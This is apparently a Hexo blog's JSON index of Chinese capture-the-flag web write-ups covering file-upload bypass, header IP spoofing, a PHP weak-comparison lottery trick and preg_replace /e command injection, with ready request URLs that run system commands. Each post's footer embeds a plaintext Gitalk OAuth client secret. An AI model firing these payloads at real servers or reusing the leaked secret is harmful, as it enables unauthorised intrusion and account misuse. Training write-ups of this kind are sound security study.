{"meta":{"title":"MR-eggegg","subtitle":"boko","description":"kobo","author":"egg","url":"http://yoursite.com","root":"/"},"pages":[{"title":"tags","date":"2019-12-23T17:42:01.000Z","updated":"2019-12-24T03:34:47.034Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-12-23T17:38:51.000Z","updated":"2019-12-24T03:34:47.033Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"CTF攻防世界-WEB-bug","slug":"ctf-web-bug","date":"2019-12-28T02:44:52.000Z","updated":"2019-12-28T03:26:55.489Z","comments":true,"path":"2019/12/28/ctf-web-bug/","link":"","permalink":"http://yoursite.com/2019/12/28/ctf-web-bug/","excerpt":"0x01 前要 1.文件上传绕过 2.apache的文件解析漏洞","text":"0x01 前要 1.文件上传绕过 2.apache的文件解析漏洞 0x02 解题流程与思路 1.看到登陆界面，尝试sql注入，无果。 2.按流程注册账号，登陆，登陆成功，但显示只有admin用户才允许使用特权 3.已知用户为admin，考虑到是不是要用字典爆破密码。但是看到wp里，可以通过修改密码时，通过修改传参，修改admin的密码。 4.显示IP not allowed发现仍然登陆失败，抓包查看请求IP。 123请求网址:http://111.198.29.45:34163/index.php?module=admin请求方法:GET远程地址:127.0.0.1:8080 4_1.修改IP 为127.0.0.1，成功登陆，并找到线索 1&lt;!-- index.php?module=filemanage&amp;do=???--&gt; 5.根据线索，已知是文件管理模型，猜测do为增删查改，尝试write，download,read,upload。最后确认为upload。 6.尝试上传文件，提示只能上传图片文件，最初猜测是一句话木马，后来发现更简单粗暴。。。新建txt文件 写入下面代码，然后改后缀名为image文件，然后上传文件 1&lt;script language='php'&gt;随便写不影响解题&lt;/script&gt; 6_1.依旧抓包，改参数，将后缀名改为php5，即可获得flag 0x03 参考 1.l攻防世界WEB进阶之bug 2.关于为什么最后一步无法使用php.xxx只能改参php4/5 var gitalk = new Gitalk({ // gitalk的主要参数 clientID: &apos;dcf239aa6b46fcf244a3&apos;, clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;, repo: &apos;MR-eggegg.github.io&apos;, owner: &apos;MR-eggegg&apos;, admin: [&apos;MR-eggegg&apos;], id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;, }); gitalk.render(&apos;gitalk-container&apos;);","categories":[{"name":"CTF-WEB","slug":"CTF-WEB","permalink":"http://yoursite.com/categories/CTF-WEB/"}],"tags":[{"name":"修改传参","slug":"修改传参","permalink":"http://yoursite.com/tags/%E4%BF%AE%E6%94%B9%E4%BC%A0%E5%8F%82/"},{"name":"文件上传绕过","slug":"文件上传绕过","permalink":"http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"},{"name":"伪造ip","slug":"伪造ip","permalink":"http://yoursite.com/tags/%E4%BC%AA%E9%80%A0ip/"}]},{"title":"CTF攻防世界-WEB-lottery","slug":"ctf-lottery","date":"2019-12-27T01:55:34.000Z","updated":"2019-12-28T02:56:19.303Z","comments":true,"path":"2019/12/27/ctf-lottery/","link":"","permalink":"http://yoursite.com/2019/12/27/ctf-lottery/","excerpt":"0x01 前要 1.目录遍历-git源码泄露 2.robots协议 3.PHP 弱类型比较","text":"0x01 前要 1.目录遍历-git源码泄露 2.robots协议 3.PHP 弱类型比较 0x02 解题流程与思路 1.尝试测试网页，注册账号，购买彩票，攒足足够的钱，购买flag。 1_1.尝试购买彩票，利用浏览器工具抓包，发现购买彩票时，数据通过api.php。 2.尝试获取api.php源码，在CTF新手区时，其实我们做过类似的题目，robots协议，尝试查看robots.txt。可知网页存在.git源码泄露。 12User-agent: *Disallow: /.git/ 3.下载githack，遍历网页目录并下载3_1.下载github-python3 4.文件存在我们需要的api.php，查看api.php代码，进行代码审计。 api.php代码 展开/折叠 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164&lt;?phprequire_once(&#39;config.php&#39;);header(&#39;Content-Type: application&#x2F;json&#39;);function response($resp)&#123; die(json_encode($resp));&#125;function response_error($msg)&#123; $result &#x3D; [&#39;status&#39;&#x3D;&gt;&#39;error&#39;]; $result[&#39;msg&#39;] &#x3D; $msg; response($result);&#125;function require_keys($req, $keys)&#123; foreach ($keys as $key) &#123; if(!array_key_exists($key, $req))&#123; response_error(&#39;invalid request&#39;); &#125; &#125;&#125;function require_registered()&#123; if(!isset($_SESSION[&#39;name&#39;]) || !isset($_SESSION[&#39;money&#39;]))&#123; response_error(&#39;register first&#39;); &#125;&#125;function require_min_money($min_money)&#123; if(!isset($_SESSION[&#39;money&#39;]))&#123; response_error(&#39;register first&#39;); &#125; $money &#x3D; $_SESSION[&#39;money&#39;]; if($money &lt; 0)&#123; $_SESSION &#x3D; array(); session_destroy(); response_error(&#39;invalid negative money&#39;); &#125; if($money &lt; $min_money)&#123; response_error(&#39;you don\\&#39; have enough money&#39;); &#125;&#125;if($_SERVER[&quot;REQUEST_METHOD&quot;] !&#x3D; &#39;POST&#39; || !isset($_SERVER[&quot;CONTENT_TYPE&quot;]) || $_SERVER[&quot;CONTENT_TYPE&quot;] !&#x3D; &#39;application&#x2F;json&#39;)&#123; response_error(&#39;please post json data&#39;);&#125;$data &#x3D; json_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;), true);if(json_last_error() !&#x3D; JSON_ERROR_NONE)&#123; response_error(&#39;invalid json&#39;);&#125;require_keys($data, [&#39;action&#39;]);&#x2F;&#x2F; my boss told me to use cryptographically secure algorithm function random_num()&#123; do &#123; $byte &#x3D; openssl_random_pseudo_bytes(10, $cstrong); $num &#x3D; ord($byte); &#125; while ($num &gt;&#x3D; 250); if(!$cstrong)&#123; response_error(&#39;server need be checked, tell admin&#39;); &#125; $num &#x2F;&#x3D; 25; return strval(floor($num));&#125;function random_win_nums()&#123; $result &#x3D; &#39;&#39;; for($i&#x3D;0; $i&lt;7; $i++)&#123; $result .&#x3D; random_num(); &#125; return $result;&#125;function buy($req)&#123; require_registered(); require_min_money(2); $money &#x3D; $_SESSION[&#39;money&#39;]; $numbers &#x3D; $req[&#39;numbers&#39;]; $win_numbers &#x3D; random_win_nums(); $same_count &#x3D; 0; for($i&#x3D;0; $i&lt;7; $i++)&#123; if($numbers[$i] &#x3D;&#x3D; $win_numbers[$i])&#123; $same_count++; &#125; &#125; switch ($same_count) &#123; case 2: $prize &#x3D; 5; break; case 3: $prize &#x3D; 20; break; case 4: $prize &#x3D; 300; break; case 5: $prize &#x3D; 1800; break; case 6: $prize &#x3D; 200000; break; case 7: $prize &#x3D; 5000000; break; default: $prize &#x3D; 0; break; &#125; $money +&#x3D; $prize - 2; $_SESSION[&#39;money&#39;] &#x3D; $money; response([&#39;status&#39;&#x3D;&gt;&#39;ok&#39;,&#39;numbers&#39;&#x3D;&gt;$numbers, &#39;win_numbers&#39;&#x3D;&gt;$win_numbers, &#39;money&#39;&#x3D;&gt;$money, &#39;prize&#39;&#x3D;&gt;$prize]);&#125;function flag($req)&#123; global $flag; global $flag_price; require_registered(); $money &#x3D; $_SESSION[&#39;money&#39;]; if($money &lt; $flag_price)&#123; response_error(&#39;you don\\&#39; have enough money&#39;); &#125; else &#123; $money -&#x3D; $flag_price; $_SESSION[&#39;money&#39;] &#x3D; $money; $msg &#x3D; &#39;Here is your flag: &#39; . $flag; response([&#39;status&#39;&#x3D;&gt;&#39;ok&#39;,&#39;msg&#39;&#x3D;&gt;$msg, &#39;money&#39;&#x3D;&gt;$money]); &#125;&#125;function register($req)&#123; $name &#x3D; $req[&#39;name&#39;]; $_SESSION[&#39;name&#39;] &#x3D; $name; $_SESSION[&#39;money&#39;] &#x3D; 20; response([&#39;status&#39;&#x3D;&gt;&#39;ok&#39;]);&#125;switch ($data[&#39;action&#39;]) &#123; case &#39;buy&#39;: require_keys($data, [&#39;numbers&#39;]); buy($data); break; case &#39;flag&#39;: flag($data); break; case &#39;register&#39;: require_keys($data, [&#39;name&#39;]); register($data); break; default: response_error(&#39;invalid request&#39;); break;&#125; （1）requests是json格式（2）玩家输入的彩票数字与系统随机生成的数字对比为==弱比较（3）并且比较为一位一位的比较 1234for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; 5.已知为php弱比较型，利用Burp Suite传包，进行数字比较时，使得任何数字都与系统生成数字相等，即ture。post数据是action，调用buy函数。以及我们输入的数字number。不停的传包，使得我们获得足够的钱，购买flag。 1&#123;\"action\":\"buy\",\"numbers\":[true,true,true,true,true,true,true]&#125; 0x04 参考 1.lottery!（about /.git） var gitalk = new Gitalk({ // gitalk的主要参数 clientID: &apos;dcf239aa6b46fcf244a3&apos;, clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;, repo: &apos;MR-eggegg.github.io&apos;, owner: &apos;MR-eggegg&apos;, admin: [&apos;MR-eggegg&apos;], id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;, }); gitalk.render(&apos;gitalk-container&apos;);","categories":[{"name":"CTF-WEB","slug":"CTF-WEB","permalink":"http://yoursite.com/categories/CTF-WEB/"}],"tags":[{"name":"目录遍历","slug":"目录遍历","permalink":"http://yoursite.com/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"},{"name":"git源码泄露","slug":"git源码泄露","permalink":"http://yoursite.com/tags/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"name":"robots协议的利用","slug":"robots协议的利用","permalink":"http://yoursite.com/tags/robots%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP 弱类型比较","slug":"PHP-弱类型比较","permalink":"http://yoursite.com/tags/PHP-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/"}]},{"title":"CTF攻防世界-WEB-cis05","slug":"ctf-ics-05","date":"2019-12-23T15:30:33.000Z","updated":"2019-12-27T02:00:38.755Z","comments":true,"path":"2019/12/24/ctf-ics-05/","link":"","permalink":"http://yoursite.com/2019/12/24/ctf-ics-05/","excerpt":"0x01 前要 1.php内置封装协议 filter2.伪造IP3.preg_replace()函数的/e漏洞4.正确的php system()函数的书写","text":"0x01 前要 1.php内置封装协议 filter2.伪造IP3.preg_replace()函数的/e漏洞4.正确的php system()函数的书写 0x02 解题流程与思路 1.打开题目网页点击尝试，发现只有维护中心可以点击 F12查看源代码，可以看到代码段?page=index，同时网页表现为 xxxx/index.php，此时可以猜测题目可能为文件包含读取网页的漏洞。利用php内置filter协议协助网页传参，查看结果。 2_1. 1&lt;li class=\"layui-nav-item layui-this\"&gt;&lt;a href=\"?page=index\"&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt; 2_2.为了能够正常读取到内置文件的内容，所以采用base64模式提前将php内置文件源码我们所需的部分转化为base64形式，取得代码后在线转码即可获得源码。 1?page=php://filter/read=convert.base64-encode/resource=index.php 3.转码获得源码 12345678910111213if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125; 3_1.代码审计（1）我们需要从127.0.0.1 IP地址登陆，使用Burp Suite伪造html头IP（1_1）可以看到我们登陆成功 （2）preg_replace危险的/e修饰符 简单的说明一下preg_replace（）函数，详细的说明以及示例可以点击超链接，阅读另一位博主的详细说明 1234567preg_replace ($pattern , $replacement , $subject [, int $limit = -1 [, int &amp;$count ]] )$pattern: 搜索的模式，可以是字符串或一个字符串数组。$replacement: 用于替换的字符串或字符串数组。$subject: 要搜索替换的目标字符串或字符串数组。关于/e： 当pattern中有/e是代表preg_replace()函数的/e时，subject中匹配到的pattern会将replacement当作代码执行。 潜在威胁： 当replacement为可控时，可以直接编写一句话木马 （2_2）利用漏洞寻找flag %20代表空格，%26%26就是&amp;&amp;代表当前面命令执行成功时，继续执行后面的命令 1/index.php?pat=/test/e&amp;rep=system(\"ls\")&amp;sub=haha%20test (2_3)根据文件目录，查看可疑文件layui和s3chahahaDir，通过cd到文件夹，查看文件内容，最终确认为s3chahahaDir文件夹 1/index.php?pat=/test/e&amp;rep=system(\"cd%20s3chahahaDir%26%26%20ls\")&amp;sub=haha%20test （2_4）找到flag文件夹后，继续cd，寻找所需的flag 1/index.php?pat=/test/e&amp;rep=system(\"cd%20s3chahahaDir/flag%26%26%20ls\")&amp;sub=haha%20test (2_5)确认flag所在的文件，直接抓取内容 1/index.php?pat=/test/e&amp;rep=system(\"cat%20s3chahahaDir/flag/flag.php\")&amp;sub=haha%20test 成功找到flag 0x03 解题过程中存在的问题 1.Burp Suite存在复制黏贴产生报错结果，建议可以手打重新尝试 0x04 参考 1.攻防世界web进阶ics-05 wp 2.preg_replace危险的/e修饰符 3.攻防世界ics-5wp var gitalk = new Gitalk({ // gitalk的主要参数 clientID: &apos;dcf239aa6b46fcf244a3&apos;, clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;, repo: &apos;MR-eggegg.github.io&apos;, owner: &apos;MR-eggegg&apos;, admin: [&apos;MR-eggegg&apos;], id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;, }); gitalk.render(&apos;gitalk-container&apos;);","categories":[{"name":"CTF-WEB","slug":"CTF-WEB","permalink":"http://yoursite.com/categories/CTF-WEB/"}],"tags":[{"name":"php内置filter协议","slug":"php内置filter协议","permalink":"http://yoursite.com/tags/php%E5%86%85%E7%BD%AEfilter%E5%8D%8F%E8%AE%AE/"},{"name":"伪造IP","slug":"伪造IP","permalink":"http://yoursite.com/tags/%E4%BC%AA%E9%80%A0IP/"},{"name":"preg_replace()函数的/e漏洞","slug":"preg-replace-函数的-e漏洞","permalink":"http://yoursite.com/tags/preg-replace-%E5%87%BD%E6%95%B0%E7%9A%84-e%E6%BC%8F%E6%B4%9E/"},{"name":"正确的php system()函数的书写","slug":"正确的php-system-函数的书写","permalink":"http://yoursite.com/tags/%E6%AD%A3%E7%A1%AE%E7%9A%84php-system-%E5%87%BD%E6%95%B0%E7%9A%84%E4%B9%A6%E5%86%99/"}]},{"title":"CTF攻防世界-WEB-cookie基础题","slug":"pb基础","date":"2019-12-23T15:30:33.000Z","updated":"2019-12-26T15:26:11.177Z","comments":true,"path":"2019/12/24/pb基础/","link":"","permalink":"http://yoursite.com/2019/12/24/pb%E5%9F%BA%E7%A1%80/","excerpt":"","text":"0x01 攻防世界web新手区cookie题 常规网上搜到的都是用burp suits做的，其实没必要这么麻烦，查看问题的讨论发现可以直接通过火狐浏览器 F12查看存储，获得cookie，然后查看网络获得flag Chrome浏览器可以通过控制台输入alert(document.cookie)查看cookie cookie 0x02 图流程 var gitalk = new Gitalk({ // gitalk的主要参数 clientID: &apos;dcf239aa6b46fcf244a3&apos;, clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;, repo: &apos;MR-eggegg.github.io&apos;, owner: &apos;MR-eggegg&apos;, admin: [&apos;MR-eggegg&apos;], id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;, }); gitalk.render(&apos;gitalk-container&apos;);","categories":[{"name":"CTF-WEB基础","slug":"CTF-WEB基础","permalink":"http://yoursite.com/categories/CTF-WEB%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"抓包基础题","slug":"抓包基础题","permalink":"http://yoursite.com/tags/%E6%8A%93%E5%8C%85%E5%9F%BA%E7%A1%80%E9%A2%98/"}]},{"title":"低估的Web威胁-备份文件","slug":"CTF-python3代码大全","date":"2019-12-23T15:15:36.000Z","updated":"2019-12-27T03:44:17.935Z","comments":true,"path":"2019/12/24/CTF-python3代码大全/","link":"","permalink":"http://yoursite.com/2019/12/24/CTF-python3%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8/","excerpt":"","text":"0x01二进制转字符串 二进制转字符串 12345678910111213&#96;&#96;&#96; # gif 二进制转字符串import rea &#x3D; &#39;01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101&#39;b &#x3D; re.findall(r&#39;.&#123;8&#125;&#39;,a)flag &#x3D; &#39;&#39;for i in b: flag +&#x3D; chr(int(i,2))print(flag) 123456&lt;div class=\"note danger\"&gt;&lt;p&gt;0x02没有删除版本控制系统产生的备份文件&lt;/p&gt;&lt;/div&gt; 几乎所有的控制系统VCS都会在工程目录下建一个meta目录，这个文件记录了整个项目工程每次修改的记录。而开发者修改项目仓库的时候就直接下载/克隆代码仓库，改为后直接上传到web服务器上。但是很多时候，VCS产生的目录并没有删除掉，这样的话，如果被攻击者找到，将会使整个工程泄露。&#123;% note default %&#125; default &#123;% endnote %&#125;","categories":[{"name":"CTF-WEB","slug":"CTF-WEB","permalink":"http://yoursite.com/categories/CTF-WEB/"}],"tags":[{"name":"python3 工具合集","slug":"python3-工具合集","permalink":"http://yoursite.com/tags/python3-%E5%B7%A5%E5%85%B7%E5%90%88%E9%9B%86/"}]}]}